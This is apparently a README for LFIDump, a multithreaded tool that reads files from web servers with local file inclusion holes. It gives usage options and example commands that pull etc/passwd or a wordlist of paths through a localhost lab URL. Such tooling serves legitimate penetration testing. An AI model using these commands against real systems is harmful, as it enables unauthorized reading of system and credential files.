# LFIDump

## Setup 

`pip install -r requirements.txt`

## Features

 - [x] Dump a single file with `-f path/to/remote/file.txt`
 - [x] Dump files from a wordlist with `-F /path/to/local/wordlist.txt`
 - [x] Custom output directory with `-o/--output`
 - [x] Multithreaded with -t (defualt of 10 threads)

## Usage

```
./LFIDump.py -h                                            
usage: LFIDump.py [-h] [-v] -u URL (-f FILE | -F FILELIST) [-o OUTPUT] [-t THREADS] [-fs FILTER_SIZE] [-fw FILTER_WORDS]

Description message

options:
  -h, --help            show this help message and exit
  -v, --verbose         Verbose mode. Print both successful and failed attempts.
  -u URL, --url URL     URL to connect to. (example: http://localhost/?page=LFIPATH)
  -f FILE, --file FILE  Remote file to read.
  -F FILELIST, --filelist FILELIST
                        File containing a list of paths to files to read remotely.
  -o OUTPUT, --output OUTPUT
                        Directory where the dumped files will be stored.
  -t THREADS, --threads THREADS
                        Number of threads to use. (default: 10)
  -fs FILTER_SIZE, --filter-size FILTER_SIZE
                        Filter results based on the amount of bytes.
  -fw FILTER_WORDS, --filter-words FILTER_WORDS
                        Filter results based on the amount of words.
```

## Examples

 + Dump a single file
    ```
    ./LFIDump.py -u "http://localhost:8000/lfi.php?page=LFIPATH" -f etc/passwd
    ```
   
 + Dump files from a wordlist
    ```
    ./LFIDump.py -u "http://localhost:8000/lfi.php?page=LFIPATH" -F ./wordlists/all.txt
    ```
    
